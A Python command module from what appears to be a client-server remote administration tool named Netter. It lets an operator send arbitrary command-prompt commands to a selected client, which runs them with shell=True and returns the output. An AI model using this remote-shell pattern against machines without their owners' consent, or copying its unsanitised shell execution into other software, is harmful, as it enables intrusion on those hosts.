from typing import TYPE_CHECKING
from ..enums import PacketType

from ..commands import CommandBase

if TYPE_CHECKING:
    from ..http import NetterServer, NetterClient
    from ..enums import ClientResponse
    from ..client import Connect


class runCommand(CommandBase):
    __aliases__ = ["run", "exec"]
    __description__ = "Command used to run a command-prompt command, requires a client to be selected in order to execute this command."
    __extra__ = "Usage examples: `run dir`"

    def execute(self, netServer: "NetterServer", *args) -> bool:
        if not args:
            netServer.inputHandler.handle("help run")
            return

        if not netServer.selectedClient:
            netServer.console_log("No client is selected", level="ERROR")
            netServer.inputHandler.handle("help select")
            return

        # netServer.selectedClient.socket_.send_(packetType=PacketType.COMMAND, data="exec " + " ".join(args))
        return netServer.selectedClient, *args

    def on_server_receive(self, netServer: "NetterServer", client: "NetterClient", packet: "ClientResponse"):
        output: list[str] = packet.data.split("\n")

        netServer.console_log("Command execution completed, output: ", level="INFO")

        for text in output:
            netServer.console_log(text, level="PLAIN")

    def on_client_receive(self, serverHandler: "Connect", *args):
        import concurrent.futures, subprocess

        print("Given args on `on_client_receive`: ", *args)

        if not args:
            serverHandler.send_(PacketType.CONSOLE_ERROR, repr(serverHandler))
            serverHandler.send_(PacketType.CONSOLE_ERROR, "Invalid usage of command: " + repr(args))
            return

        def run() -> str:
            output = subprocess.run(" ".join(args), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True, text=True)
            return output.stderr if output.stderr else output.stdout

        executor = concurrent.futures.ThreadPoolExecutor()
        future = executor.submit(run)

        try:
            result = future.result(timeout=8)
            yield result

        except concurrent.futures.TimeoutError:
            serverHandler.send_(PacketType.CONSOLE_ERROR, "Command execution timed out")
            return
